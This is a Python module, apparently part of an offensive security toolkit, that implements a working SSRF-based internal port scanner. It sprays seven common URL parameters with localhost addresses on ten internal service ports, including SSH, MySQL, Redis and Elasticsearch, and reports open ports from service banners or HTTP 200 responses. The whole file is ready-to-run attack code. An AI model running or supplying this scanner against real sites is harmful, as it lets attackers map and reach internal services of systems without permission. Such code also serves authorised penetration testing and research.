import asyncio
from modules.core import console

# SSRF Port Scanner
# If we have an SSRF (server fetching URL for us), we can make it scan its own internal network.
# Target: 127.0.0.1 (Localhost)
# Targets key internal ports.

INTERNAL_PORTS = [
    22,   # SSH
    25,   # SMTP
    80,   # HTTP Internal
    443,  # HTTPS Internal
    3306, # MySQL
    6379, # Redis
    8000, # Alt HTTP
    8080, # Alt HTTP
    9000, # FastCGI/Docker
    9200  # Elasticsearch
]

async def check_ssrf_port(session, url, param, port):
    try:
        target_internal = f"http://127.0.0.1:{port}"
        
        # Inject into param
        # We look for *difference* in response.
        # e.g. Connection Refused (FAST) vs Timeout (SLOW) vs Data (Open)
        
        target = f"{url}?{param}={target_internal}"
        if "?" in url: target = f"{url}&{param}={target_internal}"
        
        start_time = asyncio.get_event_loop().time()
        try:
            async with session.get(target, timeout=3, ssl=False) as resp:
                text = await resp.text()
                # Heuristics:
                # If we see service banners (e.g. SSH-2.0, Redis, mysql)
                if "SSH-" in text or "redis_version" in text or "mysql" in text.lower():
                     return {
                        "url": target,
                        "param": param,
                        "port": port,
                        "status": "OPEN (Banner Detected)",
                        "evidence": text[:50]
                    }
                
                # If response time is very different? (Simpler to just check status 200 vs 500)
                if resp.status == 200:
                     return {
                         "url": target,
                         "param": param,
                         "port": port,
                         "status": "OPEN (HTTP 200)",
                         "evidence": "Internal Service Reachable"
                     }
                     
        except Exception:
            pass
            
    except Exception:
        pass
    return None

async def scan_ssrf_port(session, url):
    """
    Scan for SSRF Internal Ports (Network Mapping).
    """
    console.print(f"\n[bold cyan]--- SSRF Port Scanner (Internal) ---[/bold cyan]")
    
    # We generally need to know WHICH param is vulnerable to SSRF first.
    # But in this aggressive mode, we spray common SSRF params.
    params = ["url", "link", "src", "target", "dest", "proxy", "fetch"]
    
    tasks = []
    for p in params:
        for port in INTERNAL_PORTS:
            tasks.append(check_ssrf_port(session, url, p, port))
            
    results = await asyncio.gather(*tasks)
    
    found = []
    for res in results:
        if res:
             console.print(f"  [bold red][!] INTERNAL PORT FOUND: {res['port']} via {res['param']}[/bold red]")
             console.print(f"      Status: {res['status']}")
             found.append(res)
             
    if not found:
        console.print("[dim][-] No internal ports reachable via SSRF vectors.[/dim]")
        
    return found
